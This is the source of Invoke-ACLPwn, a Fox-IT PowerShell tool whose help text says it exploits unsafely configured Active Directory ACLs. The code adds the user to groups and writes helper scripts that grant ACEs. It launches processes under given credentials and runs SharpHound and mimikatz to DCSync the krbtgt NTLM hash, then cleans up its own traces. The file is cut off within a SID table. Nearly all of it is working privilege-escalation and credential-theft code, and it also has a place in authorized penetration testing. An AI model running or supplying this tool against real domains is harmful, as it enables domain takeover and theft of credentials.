### Written by Rindert Kramer

####################
#
# Copyright (c) 2018 Fox-IT
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISNG FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
####################

# thx: https://github.com/NickolajA/PowerShell/blob/master/AzureAD/Set-AADSyncPermissions.ps1
# thx: https://social.technet.microsoft.com/Forums/ie/en-US/f238d2b0-a1d7-48e8-8a60-542e7ccfa2e8/recursive-retrieval-of-all-ad-group-memberships-of-a-user?forum=ITCG
# thx: https://raw.githubusercontent.com/canix1/ADACLScanner/master/ADACLScan.ps1
# thx: https://blogs.msdn.microsoft.com/dsadsi/2013/07/09/setting-active-directory-object-permissions-using-powershell-and-system-directoryservices/

[CmdletBinding()]
[Alias()]
[OutputType([int])]
Param
(
    [string]$domain,
    [string]$username,
    [string]$password,    
    [string]$protocol = 'LDAP',
    [string]$port = 389,
    [switch]$WhatIf,
    [switch]$NoSecCleanup,
    [switch]$NoDCSync,
    [string]$mimiKatzLocation,
    [string]$SharpHoundLocation,
    [string]$userAccountToPwn = 'krbtgt',
    [switch]$logToFile   
)

#region ADFunctions


#Adds users to given group
function Set-GroupMembership ($groupDN, [switch]$Remove) {

    if ($global:ldapConnInfo.Integrated_Login){
        $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext `
                        'Domain', $($global:ldapConnInfo.domain)
    }
    else {
            $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext `
                        'Domain', $($global:ldapConnInfo.domain), $($global:ldapConnInfo.username),$($global:ldapConnInfo.password)
    }

    $idType = [System.DirectoryServices.AccountManagement.IdentityType]::DistinguishedName
    $grpPrincipal = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($principalContext, $idType, $groupDN)

    if ($grpPrincipal -eq $null){
        Write-Bad "$($GroupDN) not found."
    } else{

        # do we need to remove the account?
        if ($Remove) {
            [void]$grpPrincipal.Members.Remove($principalContext, $idType, $($global:ldapConnInfo.distinguishedName))
        } else {    
            [void]$grpPrincipal.Members.Add($principalContext, $idType, $($global:ldapConnInfo.distinguishedName))
        }
        $grpPrincipal.Save()    
        
        return 'Done'
    }

    # cleanup
    $principalContext.Dispose()

    if ($grpPrincipal -ne $null){
        $grpPrincipal.Dispose()
    }
}

# Gets given attribute for AD object
function Get-AttrForADObject ([string]$objectName, [string[]]$props) {
    
    $result = [string]::Empty

    # Sharphound returns sAmAccountname with @domain
    $ldapQuery = "(&(objectClass=user)(|(name=$objectName)(sAMAccountName=$objectName)(userPrincipalName=$objectName)))"
    if ($objectName.ToString().Contains('@')) {
        $_user = $objectName.split('@')[0]
        $ldapQuery = "(&(objectClass=user)(|(name=$objectName)(sAMAccountName=$_user)(sAMAccountName=$objectName)(userPrincipalName=$objectName)))"
    }
    
    $dirEntry = Get-DirEntry -ldapDN $global:ldapConnInfo.LDAPConnString
    $dirSearcher = New-Object System.DirectoryServices.DirectorySearcher $dirEntry
    $dirSearcher.Filter = $ldapQuery
    [void]$dirSearcher.PropertiesToLoad.AddRange($props)
    $sResult = $dirSearcher.FindOne()

    if ($sResult -eq $null) {
        throw '[Get-AttrForADObject] User not found.'
    }

    $result = $sResult.Properties

    # cleanup
    try {
        $dirSearcher.Dispose()
        $dirEntry.Dispose()
    }

    catch {}

    return $result

}

# Get distinguishedName for an AD object
function Get-DistinguishedNameForObject ([string]$obj) {
    
    # Sharphound returns sAmAccountname with @domain
    $ldapQuery = "(&(|(objectClass=group)(objectClass=user))(|(sAMAccountName=$obj)(userPrincipalName=$obj)))"
    if ($obj.ToString().Contains('@')) {
        $_obj = $obj.split('@')[0]
        $ldapQuery = "(&(|(objectClass=group)(objectClass=user))(|(sAMAccountName=$_obj)(sAMAccountName=$obj)(userPrincipalName=$obj)))"
    }

    $result = [string]::Empty
    $dirEntry = Get-DirEntry -ldapDN $global:ldapConnInfo.LDAPConnString
    $dirSearcher = New-Object System.DirectoryServices.DirectorySearcher $dirEntry
    $dirSearcher.Filter = $ldapQuery
    [void]$dirSearcher.PropertiesToLoad.Add('distinguishedName')
    $sResult = $dirSearcher.FindOne()

    if ($sResult -eq $null) {
        throw '[Get-DistinguishedNameForObject] User not found.'
    }

    $result = $sResult.Properties['distinguishedName'][0]

    # cleanup
    $dirSearcher.Dispose()
    $dirEntry.Dispose()

    return $result
}

# Get groupmembership for supplied user
function Get-GroupMembership([string]$objName, [bool]$recursive = $true) {
    
    $results = @()

    # Get DN for user
    $dirEntry = Get-DirEntry -ldapDN $global:ldapConnInfo.LDAPConnString
    $ObjDN = Get-DistinguishedNameForObject -obj $objName

    # Use custom OID (LDAP_MATCHING_RULE_IN_CHAIN) for finding groups that this user is a (in)direct member of
    # Search from top of the domain
    $domainDirEntry = Get-DomainDirEntry -dirEntry $dirEntry

    # Make the seach recursive, or not.
    [string]$ldapFilter = [string]::Empty
    if ($recursive) {
        $ldapFilter = "(member:1.2.840.113556.1.4.1941:=$ObjDN)"
    } else {
        $ldapFilter = "(member=$ObjDN)"
    }

    $dirSearcher = New-Object System.DirectoryServices.DirectorySearcher $domainDirEntry      
    $dirSearcher.Filter = $ldapFilter
    $dirSearcher.PageSize = 1000
    $dirSearcher.SearchScope = "Subtree"    

    $sResults = $dirSearcher.FindAll()

    if ($sResults -eq $null) {
        throw '[Get-Groupmembership] User not found.'
    }

    $sResults | ForEach-Object {  
        $results += New-Object PSObject -Property @{
            'groupDN'   = $_.Properties['distinguishedName'][0]
            'NTAccount' = $_.Properties['sAMAccountName'][0]
        }               
    }

    # cleanup
    $dirEntry.Dispose()
    $domainDirEntry.Dispose()
    $dirSearcher.Dispose()

    return $results
}

# Gets groupmembership of object
function Get-GroupMember ([string]$objectName){
    
    $results = @()

    # Get DN for user
    $dirEntry = Get-DirEntry -ldapDN $global:ldapConnInfo.LDAPConnString
    $ObjDN = Get-DistinguishedNameForObject -obj $objectName 

    # Use custom OID (LDAP_MATCHING_RULE_IN_CHAIN) for finding groups that this user is a (in)direct member of
    # Search from top of the domain
    $domainDirEntry = Get-DomainDirEntry -dirEntry $dirEntry

    $dirSearcher = New-Object System.DirectoryServices.DirectorySearcher $domainDirEntry      
    $dirSearcher.Filter = "(memberOf:1.2.840.113556.1.4.1941:=$ObjDN)"
    $dirSearcher.PageSize = 1000
    $dirSearcher.SearchScope = "Subtree"    

    $sResults = $dirSearcher.FindAll()

    if ($sResults -eq $null) {
        throw '[Get-Groupmember] User/Object not found.'
    }

    $sResults | ForEach-Object {  
        $results += New-Object PSObject -Property @{
            'groupDN'   = $_.Properties['distinguishedName'][0]
            'NTAccount' = $_.Properties['sAMAccountName'][0]
        }               
    }

    # cleanup
    $dirEntry.Dispose()
    $domainDirEntry.Dispose()
    $dirSearcher.Dispose()
    
    return $results

}

# Get-DomainDirEntry
function Get-DomainDirEntry {
       
    $dirEntry = Get-DirEntry -ldapDN $global:ldapConnInfo.LDAPConnString
    $dirSearcher = New-Object System.DirectoryServices.DirectorySearcher $dirEntry
    $dirSearcher.Filter = "(&(objectClass=domain))"

    $sResult = $dirSearcher.FindOne()

    if ($sResult -eq $null) {
        throw '[Get-DomainDirEntry] Domain not found.'
    }

    $domainDirEntry = $sResult.GetDirectoryEntry()

    # cleanup
    $dirEntry.Dispose()
    $dirSearcher.Dispose()
    
    return $domainDirEntry    
}

# Get-DomainDN
function Get-DomainDN {
       
    $dirEntry = Get-DirEntry -ldapDN $global:ldapConnInfo.LDAPConnString
    $dirSearcher = New-Object System.DirectoryServices.DirectorySearcher $dirEntry
    $dirSearcher.Filter = "(&(objectClass=domain))"

    $sResult = $dirSearcher.FindOne()

    if ($sResult -eq $null) {
        throw '[Get-DomainDN] Domain not found.'
    }

    $domainDirEntry = $sResult.Path
    $dirEntry.Dispose()
    $dirSearcher.Dispose()
    
    return $domainDirEntry    
}

# Get Schema and config DN
function Get-SchemaAndConfigContext {

    $dirEntry = Get-DirEntry "LDAP://$($global:ADInfo.primaryDC)/RootDSE"        
    $schemaContext = $dirEntry.schemaNamingContext
    $configContext = $dirEntry.configurationNamingContext
    
    $global:ADInfo.ConfigurationNamingContext = $configContext[0]
    $global:ADInfo.schemaNamingContext = $schemaContext[0]

    #cleanup
    $dirEntry.Dispose()       
}

# Get classes from schema
function Get-SchemaClasses {
        
    # We need the schemacontext for this one    
    $schemaDirEntry = Get-DirEntry "$($global:ldapConnInfo.protocol)://$($global:ADInfo.primaryDC)/$($global:ADInfo.schemaNamingContext)"
    
    $dirSearcher = New-Object System.DirectoryServices.DirectorySearcher $schemaDirEntry
    $dirSearcher.Filter = "(schemaIDGUID=*)"
    $dirSearcher.PageSize = 10000000
    [void]$dirSearcher.PropertiesToLoad.Add('ldapDisplayName')
    [void]$dirSearcher.PropertiesToLoad.Add('schemaIDGUID')

    $sResult = $dirSearcher.FindAll()

    if ($sResult -eq $null) {
        throw '[Get-SchemaClasses] No SchemaClasses not found.'
    }

    #$results = @()
    $results = @{}
    foreach ($r in $sResult) {
        $results[$r.Properties['ldapDisplayName'][0]] = [guid]$r.Properties['schemaidguid'][0]
    }
   
    #cleanup
    $schemaDirEntry.Dispose()
    $dirSearcher.Dispose()

    # Add some static guids
    # ref: https://technet.microsoft.com/en-us/library/ff406260.aspx
    $constGUID = @()
    $constName = @()

    $constGUID += '72e39547-7b18-11d1-adef-00c04fd8d5cd'
    $constGUID += 'b8119fd0-04f6-4762-ab7a-4986c76b3f9a'
    $constGUID += 'c7407360-20bf-11d0-a768-00aa006e0529'
    $constGUID += 'e45795b2-9455-11d1-aebd-0000f80367c1'
    $constGUID += '59ba2f42-79a2-11d0-9020-00c04fc2d3cf'
    $constGUID += 'bc0ac240-79a9-11d0-9020-00c04fc2d4cf'
    $constGUID += '77b5b886-944a-11d1-aebd-0000f80367c1'
    $constGUID += 'e48d0154-bcf8-11d1-8702-00c04fb96050'
    $constGUID += '4c164200-20c0-11d0-a768-00aa006e0529'
    $constGUID += '5f202010-79a5-11d0-9020-00c04fc2d4cf'
    $constGUID += 'e45795b3-9455-11d1-aebd-0000f80367c1'

    $constName += 'DNS Host Name Attributes'
    $constName += 'Other Domain Parameters'
    $constName += 'Domain Password and Lockout Policies'
    $constName += 'Phone and Mail Options'
    $constName += 'General Information'
    $constName += 'Group Membership'
    $constName += 'Personal Information'
    $constName += 'Public Information'
    $constName += 'Account Restrictions'
    $constName += 'Logon Information'
    $constName += 'Web Information'

    for ($i = 0; $i -lt $constName.Length; $i++) {
        <#$results += New-Object PSObject -Property @{
            'LDAPPath'        = [string]::Empty
            'schemaIdGuid'    = $constGUID[$i]
            'ldapDisplayName' = $constName[$i]
        }#>
        $results[$constName[$i]] = $constGUID[$i]
    }


    return $results
}

# Get all names and GUIDs of extended rights
function Get-ExtendedRights {
    
    # We need the configurationcontext for this one
    
    $configDirEntry = Get-DirEntry "$($global:ldapConnInfo.protocol)://$($global:ADInfo.primaryDC)/$($global:ADInfo.ConfigurationNamingContext)"    
    $dirSearcher = New-Object System.DirectoryServices.DirectorySearcher $configDirEntry
    $dirSearcher.PageSize = 10000000
    $dirSearcher.Filter = "(&(objectClass=controlAccessRight)(rightsGUID=*))"

    [void]$dirSearcher.PropertiesToLoad.Add('displayName')
    [void]$dirSearcher.PropertiesToLoad.Add('rightsGUID')

    $sResult = $dirSearcher.FindAll()

    $results = @()
    foreach ($r in $sResult) {
        $results += New-Object PSObject -Property @{
            'schemaIdGuid'    = [guid]$r.Properties['rightsGUID'][0]
            'ldapDisplayName' = $r.Properties['displayName'][0]
            'LDAPPath'        = $r.Properties['adspath'][0]
        }
    }

    # cleanup
    $configDirEntry.Dispose()
    $dirSearcher.Dispose()

    return $results
}

# Returns the value of a well known SID or the already found NTAccount name
function Translate-IdentityReference ($reference, [bool]$resolve) {
    
    $result = [string]::Empty
    

    $result = $global:dicKnownSids[$reference]

    if ($result -eq $null) {
        
        # Do we need to resolve?
        if ($resolve) {
            $t = Get-DirEntry "$($global:ldapConnInfo.protocol)://$($global:ADInfo.primaryDC)/<SID=$reference>"

            $foundRef = $t.Name
            if ([string]::IsNullOrEmpty($foundRef)) {
                # No name found. return $reference
                $foundRef = $reference
            }
            else {                                  
                # Add to our dictionary
                $global:dicKnownSids[$reference] = $t.Name.Value
            }

            $reference = $foundRef
        }
        
        $result = $reference
    }

    return $result
}

# Retrieve ACL of given ldap object
function Get-ADObjectACL ($objectDN) {

    # Check if we need to resolve SIDs
    $partOfDomain = (Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain
    $LookupSIDs = $false
    if (-not $partOfDomain) {
        Write-Status 'This computer is not part of the target domain. Will lookup SIDs manually.'
        $LookupSIDs = $true
    }


    # Takes a while
    $results = @()    
    $dirEntry = Get-DirEntry -ldapDN $objectDN
    
    # Retrieve ACL for domainobject
    $ruleType = [System.Security.Principal.NTAccount]
    $accessRules = $dirEntry.get_ObjectSecurity().GetAccessRules($true, $true, $ruleType)

    $iCounter = 0

    foreach ($ace in $accessRules) {

        $eR = [string]::Empty
        $attribute = [string]::Empty
        $identifyReference = [string]::Empty

        # Convert extendedright to something readable
        if ($ace.ActiveDirectoryRights -eq 'ExtendedRight') {
            $eR = ($global:ADInfo.extendedRights | Where-Object {$_.schemaIdGuid -eq $ace.ObjectType}).ldapDisplayName
        }
        else {            
            $attribute = ($global:ADInfo.schemaClasses.GetEnumerator() | Where-Object {$_.Value.Guid -eq $ace.ObjectType}).Name
        }
        
        # Get ID reference
        $identifyReference = Translate-IdentityReference $ace.IdentityReference.Value -resolve $LookupSIDs

        $results += New-Object PSObject -Property @{
            
            'RightType'         = $ace.ActiveDirectoryRights
            'Allow/Deny'        = $ace.AccessControlType
            'IdentityReference' = $identifyReference
            'rawIdRef'          = $ace.IdentityReference.Value   
            'extendedRight'     = $eR
            'attribute'         = $attribute
            'Applies to'        = ($global:ADInfo.schemaClasses | Where-Object {$_.schemaIdGuid -eq $ace.InheritedObjectType}).ldapDisplayName
        }

        $iCounter++
        Write-Progress -Activity "Parsing ACL for object '$objectDN'. This may take a while.." `
            -PercentComplete $($iCounter / $accessRules.Count * 100) `
            -Status "Parsing ACE for $($identifyReference)"
    }
    
    # cleanup
    $dirEntry.Dispose()

    return new-object PSObject -property @{
        'Parsed_result' = $results
        'raw_results'   = $accessRules
    }
}

# Gets directoryEntry to supplied LDAPDN. 
function Get-DirEntry ($ldapDN) {
       
    $_ldapDN = [string]::Empty

    # Check if DN starts with LDAP:// or GC://
    if (-not ($ldapDN -imatch '^(?:ldap|gc)\:\/\/.+(\d{1,3})?')) {
        $_ldapDN = "$($global:ldapConnInfo.protocol)://$($ldapDN)"
    }
    else {
        $_ldapDN = $ldapDN
    }
    
    $authType = [System.DirectoryServices.AuthenticationTypes]::Secure
            
    if ($global:ldapConnInfo.Integrated_Login) {

        $_dirEntry = New-Object System.DirectoryServices.DirectoryEntry $global:ldapConnInfo.LDAPConnString        
    }
    else {
        $_dirEntry = New-Object System.DirectoryServices.DirectoryEntry $global:ldapConnInfo.LDAPConnString, $global:ldapConnInfo.Username, $global:ldapConnInfo.Password, $authType
    }

    $_dirEntry.Path = $_ldapDN
    return $_dirEntry
}

# Get primaryDC from domain
function Get-PrimaryDC {

    # Connect to AD, find domaincontroller with the PDC FSMO role
    $dirEntry = Get-DirEntry -ldapDN $global:ldapConnInfo.LDAPConnString
    $dirSearcher = New-object System.DirectoryServices.DirectorySearcher $dirEntry
    $dirSearcher.Filter = '(&(objectClass=domainDNS)(fSMORoleOwner=*))'
    [void]$dirSearcher.PropertiesToLoad.Add('fSMORoleOwner')

    $sResult = $dirSearcher.FindOne()
    $result = [string]::Empty
    if ($sResult) {
        $roleOwner = $sResult.Properties['fSMORoleOwner'][0].ToString()
        $roleOwnerParent = (Get-DirEntry "$roleOwner").Parent        
        $pDCFQDN = (Get-DirEntry "$RoleOwnerParent").dnsHostName        
    }
    else {
        Write-Error 'Failed to retrieve primary domain controller. Please check script\computer settings'
        return
    }    

    $result = $pDCFQDN

    # cleanup
    if (-not $dirSearcher.Disposed) {
        $dirSearcher.Dispose()
    }

    if (-not $dirEntry.Disposed) {
        $dirEntry.Dispose()
    }

    return $result
}

# Uses ActiveDirectory namespace from directoryservices. Newer
function Get-PrimaryDC35 {

    $dirCtx = Get-DirectoryContext -ctxType Domain -targetName $global:ldapConnInfo.domain
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($dirCtx)
    $pdc = $domain.PdcRoleOwner.Name    

    # cleanup
    $domain.Dispose()

    return $pdc
}

# returns authenticated directoryContext
function Get-DirectoryContext {
    param (
        [System.DirectoryServices.ActiveDirectory.DirectoryContextType]$ctxType = [System.DirectoryServices.ActiveDirectory.DirectoryContextType]::Domain,
        [string]$targetName = [string]::empty
    )   
    
    if ($global:ldapConnInfo.Integrated_Login) {
        $dirCtx = new-object System.DirectoryServices.ActiveDirectory.DirectoryContext $ctxType, $targetName
    }
    else {
        $dirCtx = new-object System.DirectoryServices.ActiveDirectory.DirectoryContext $ctxType, $targetName,
        $global:ldapConnInfo.username, $global:ldapConnInfo.Password
    }    

    return $dirCtx
}

#endregion

#region ScriptFunctions

function Get-Help {

    $helpMsg = @"

    This tool can be used to calculate and exploit unsafe configured ACLs in Active Directory.
    More information: https://blog.fox-it.com/

    Required parameters:
        SharpHoundLocation: location of sharphound.exe    

    Optional parameters:
        Domain            : FQDN of the target domain
        Username          : Username to authenticate with
        Password          : Password to authenticate with
        WhatIf            : Displays only the action the script intends to do. No exploitation.
                            Access as well as potential access will increase if the user account is added
                            to security groups, so the result of this switch may look incomplete.
        NoSecCleanup      : By default, the user will be removed from the ACL and the groups that were added during runtime when the script is finished. 
                            Setting this switch will leave that in tact.
        NoDCSync          : Will not run DCSync after all necessary steps have been taken
        userAccountToPwn  : User account to retrieve NTLM hash of. Only single user accounts supported now. Defaults to krbtgt account.
        logToFile         : Switch to write console output to file with the same name as script.
        mimiKatzLocation  : location of mimikatz.exe


    The tool will use integrated authentication, unless domain FQDN, username and password are specified.
    Please note that while protocol and port are optional parameters too, they've not been
    incorporated completely within the script. 

    Usage: ./Invoke-ACL.ps1 -mimiKatzLocation <location> -SharpHoundLocation <location>`r`n   
"@

    Write-Host $helpMsg
}

function Invoke-Cleanup {

    # Removes files that were created
    Write-Status 'Removing files...'
    $global:filesCreated | Sort-Object -unique | ForEach-Object {
        Remove-Item -Path $_ -Force
    }

    # Remove ACE's
    if (-not $global:NoSecCleanup){
        Write-Status "Removing ACEs..."
        Remove-ReplicationPartner
    }

    # Remove groupmembership, LIFO
    if (-not $global:NoSecCleanup){
        for ($i = $global:GroupAdded.Count -1; $i -ge 0; $i--){
            $res = Set-GroupMembership -groupDN $global:GroupAdded[$i] -Remove 
            if ($res -ne 'Done'){
                Write-Bad "Failed to remove groupmembership for group: $($global:GroupAdded[$i])"
            } else {
                Write-Status "User removed from group: $($global:GroupAdded[$i])"
            }
        }
    }
}

function Start-PSScript ([string]$scriptLoc, [string]$scriptParam) {

    if (-not (Test-Path $scriptLoc)) {
        Write-Bad 'Script not found'
        return $false
    }

    $powershellPath = 'C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe'
    $params = "-file `"$scriptLoc`" -domain `"$($global:ldapConnInfo.domain)`" -username `"$($global:ldapConnInfo.username)`" -password `"$($global:ldapConnInfo.password)`" $scriptParam"

    $pinfo = New-Object System.Diagnostics.ProcessStartInfo
    $pinfo.FileName = "$powershellPath"
    $pinfo.RedirectStandardError = $true
    $pinfo.RedirectStandardOutput = $true
    $pinfo.UseShellExecute = $false
    $pinfo.Arguments = "$params"

    $p = New-Object System.Diagnostics.Process
    $p.StartInfo = $pinfo
    $p.Start() | Out-Null
    $p.WaitForExit()
    $output = $p.StandardOutput.ReadToEnd()
    $output += $p.StandardError.ReadToEnd()

    # cleanup
    $p.Dispose()

    return $output
}

function Invoke-Runas {
    #thx: https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Invoke-Runas.ps1
Param (
            [Parameter(Mandatory = $True)]
            [string]$User,
            [Parameter(Mandatory = $True)]
            [string]$Password,
            [Parameter(Mandatory = $False)]
            [string]$Domain=".",
            [Parameter(Mandatory = $True)]
            [string]$Binary,
            [Parameter(Mandatory = $False)]
            [string]$Args=$null,
            [Parameter(Mandatory = $True)]
            [int][ValidateSet(1,2)]
            [string]$LogonType
)  
    
        Add-Type -TypeDefinition @"
        using System;
        using System.Diagnostics;
        using System.Runtime.InteropServices;
        using System.Security.Principal;
        
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }
        
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        
        public static class Advapi32
        {
            [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
            public static extern bool CreateProcessWithLogonW(
                String userName,
                String domain,
                String password,
                int logonFlags,
                String applicationName,
                String commandLine,
                int creationFlags,
                int environment,
                String currentDirectory,
                ref  STARTUPINFO startupInfo,
                out PROCESS_INFORMATION processInformation);
        }
        
        public static class Kernel32
        {
            [DllImport("kernel32.dll")]
            public static extern uint GetLastError();
        }
"@
        
        # StartupInfo Struct
        $StartupInfo = New-Object STARTUPINFO
        $StartupInfo.dwFlags = 0x00000001
        #$StartupInfo.wShowWindow = 0x0001
        $StartupInfo.wShowWindow = 0x0000
        $StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo)
        
        # ProcessInfo Struct
        $ProcessInfo = New-Object PROCESS_INFORMATION
        
        # CreateProcessWithLogonW --> lpCurrentDirectory
        $GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName
        
        #echo "`n[>] Calling Advapi32::CreateProcessWithLogonW"
        $CallResult = [Advapi32]::CreateProcessWithLogonW(
            $User, $Domain, $Password, $LogonType, $Binary,
            $Args, 0x04000000, $null, $GetCurrentPath,
            [ref]$StartupInfo, [ref]$ProcessInfo)
        
        if (!$CallResult) {
            Write-Error "`nMmm, something went wrong! GetLastError returned:"
            Write-Error  "==> $((New-Object System.ComponentModel.Win32Exception([int][Kernel32]::GetLastError())).Message)`n"
        } 
}
    

function Write-Good ($str) {    
    $msg = "[+]`t$str"
    Write-Host $msg -ForegroundColor Green    

    if ($logToFile){
        $msg | Out-File -Append -FilePath 'Invoke-ACLPwn.log'
    }
}

function Write-Status ($str) {
    $msg = "[*]`t$str"
    Write-Host $msg -ForegroundColor Yellow    

    if ($logToFile){
        $msg | Out-File -Append -FilePath 'Invoke-ACLPwn.log'
    }
}

function Write-Bad ($str) {
    $msg = "[-]`t$str"
    Write-Host $msg -ForegroundColor Red    

    if ($logToFile){
        $msg | Out-File -Append -FilePath 'Invoke-ACLPwn.log'
    }
}

function Get-ExtendedRightByName([string]$displayname) {
    return ($global:ADInfo.extendedRights | Where-Object {$_.ldapDisplayName -eq $displayname}).schemaIdGuid.Guid
}

function Invoke-Cmd([string]$cmd, [string]$argV) {

    if (-not (Test-Path $cmd)){
        Write-Error "Path '$cmd' does not exist!"
        return
    }

    if ($global:ldapConnInfo.Integrated_Login) {
        Invoke-Expression -Command "$($cmd) $argV" | out-null
    } else {
        Invoke-Runas -User $global:ldapConnInfo.sAMAccountName -Password $global:ldapConnInfo.password -Domain $global:ldapConnInfo.domain -Binary $cmd -LogonType 0x2 -Args $argV
    }
}

# Writes Add-ACE function to file
function Write-AddACEToFile {

    $script = @'
    [CmdletBinding()]
    [Alias()]
    [OutputType([int])]
    Param
    (
        # Param1 help description
        [string]$domain,
        [string]$username,
        [string]$password,
        [string]$protocol = 'LDAP',
        [int]$port = 389,
        
        #ACE params
        [switch]$integratedLogin,
        [string]$userSIDString,    
        [string]$rightType,
        [string]$action,
        [string]$propertyGUID
    
    )
    
    #Get directoryEntry
    Add-Type -AssemblyName System.DirectoryServices    
    
    $ldapConnString = "$($protocol)://$($domain)"  
    
    try {
    
        # translate GUIDs and SIDs from string to either GUID object and a SID object
        $nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
        $propGUID = [guid]$propertyGUID
        $userSID  =  New-Object System.Security.Principal.SecurityIdentifier $userSIDString
    
        # We don't need inheritance
        $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
    
        # Build ACE
        $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $userSID , $rightType, $action, $propGUID, $inheritanceType, $nullGUID
    
        # Apply ACE. Set security masks to DACL
        if ($integratedLogin) {       
            $domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString        
        } else {
            $domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $password   
        }
    
        $secOptions = $domainDirEntry.get_Options()
        $secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
        $domainDirEntry.RefreshCache()  
        $domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)
    
        # Save and cleanup
        $domainDirEntry.CommitChanges()
        $domainDirEntry.dispose()
    
        Write-Host 'Done' -NoNewline
    }
    catch {
        Write-Host $_.Exception
    }  
'@

    $script | Out-File 'Add-ACE.ps1'

    $global:filesCreated += 'Add-ACE.ps1'    
    $global:ACEScript = (Get-ChildItem -Filter 'Add-ACE.ps1').FullName
}

# Writes AddToGroup function to file
function Write-AddToGroupToFile {

    $script = @'
        [CmdletBinding()]
    [Alias()]
    [OutputType([int])]
    Param
    (
        # Param1 help description
        [string]$domain,    
        [string]$username,
        [string]$password,
        [string]$protocol = 'LDAP',
        [string]$port = 389,

        [string]$groupDN,
        [string]$userDN
    )

    Add-Type -AssemblyName System.DirectoryServices    
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement 


    $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext 'Domain', $domain, $username, $password
    $idType = [System.DirectoryServices.AccountManagement.IdentityType]::DistinguishedName
    $grpPrincipal = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($principalContext, $idType, $groupDN)

    try {
        if ($grpPrincipal -eq $null) {        
            Write-Host 'Error' -NoNewline        
        } 
        else {
            $grpPrincipal.Members.Add($principalContext, $idType, $userDN)
            $grpPrincipal.Save()        

            Write-Host 'Done' -NoNewline
        }
    } catch {
        Write-Host 'Error' -NoNewline
    }

    # cleanup
    $principalContext.Dispose()

    if ($grpPrincipal -ne $null) {
        $grpPrincipal.Dispose()
    }
'@
    $script | Out-File 'Add-ToGroup.ps1'

    $global:filesCreated += 'Add-ToGroup.ps1'    
    $global:AddToGroupScriptFile = (Get-ChildItem -Filter 'Add-ToGroup.ps1').FullName
}


function Check-Env {
    
    if ([string]::IsNullOrEmpty($mimiKatzLocation)){

        if (-not $NoDCSync){
            Write-Bad "Please specify mimikatz location!"
            return $false
        }        
    }

    if ([string]::IsNullOrEmpty($SharpHoundLocation)){
        Write-Bad "Please specify sharphound location!"
        return $false
    }

    # Don't clean up if NODCSYNC is set
    if ($NoDCSync -or $NoSecCleanup) {
        $global:NoSecCleanup = $true
    }

    # Structure with LDAP connection info
    $global:ldapConnInfo = New-Object PSObject -Property @{
        'domain'            = $domain
        'username'          = $username
        'password'          = $password
        'protocol'          = $protocol
        'port'              = $port
        'Integrated_Login'  = $false
        'LDAPConnString'    = "$protocol`://$domain`:$port"    
        'userPrincipalName' = ''
        'sAMAccountName'    = ''
        'distinguishedName' = ''
    }
    
    # Structure with AD info
    $global:ADInfo = New-Object PSObject -Property @{
        'primaryDC'                  = ''
        'schemaNamingContext'        = ''
        'ConfigurationNamingContext' = ''
        'domainDN'                   = ''
        'schemaClasses'              = $null
        'extendedRights'             = $null
    }
    
    # Array where we store our ACEs in
    $global:ACEs = @()
    
    # Hashtable containing SIDs and identityReference that was queried from the domain.
    # We store it in a hashtable to keep the ldap queries to a minimum
    $global:dicKnownSids = @{
        "S-1-0"                  = "Null Authority"; `
            "S-1-0-0"            = "Nobody"; `
            "S-1-1"              = "World Authority"; `
            "S-1-1-0"            = "Everyone"; `
            "S-1-2"              = "Local Authority"; `
            "S-1-2-0"            = "Local "; `
            "S-1-2-1"            = "Console Logon "; `
            "S-1-3"              = "Creator Authority"; `
            "S-1-3-0"            = "Creator Owner"; `
            "S-1-3-1"            = "Creator Group"; `
            "S-1-3-2"            = "Creator Owner Server"; `
            "S-1-3-3"            = "Creator Group Server"; `
            "S-1-3-4"            = "Owner Rights"; `
